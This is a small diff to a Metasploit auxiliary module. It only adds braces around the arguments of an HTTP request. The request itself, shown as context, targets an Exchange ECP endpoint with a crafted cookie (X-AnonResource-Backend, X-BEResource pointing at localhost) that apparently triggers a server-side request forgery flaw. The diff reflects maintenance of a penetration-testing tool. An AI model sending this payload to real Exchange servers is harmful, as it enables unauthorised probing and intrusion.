@@ -66,11 +66,11 @@ class MetasploitModule < Msf::Auxiliary
     @proto = (ssl ? 'https' : 'http')
 
     uri = normalize_uri('ecp', "#{Rex::Text.rand_text_alpha(1..3)}.js")
-    received = send_request_cgi(
+    received = send_request_cgi({
       'method' => datastore['METHOD'],
       'uri' => uri,
       'cookie' => 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
-    )
+    })
     unless received
       print_error(message('No response, target seems down.'))
 
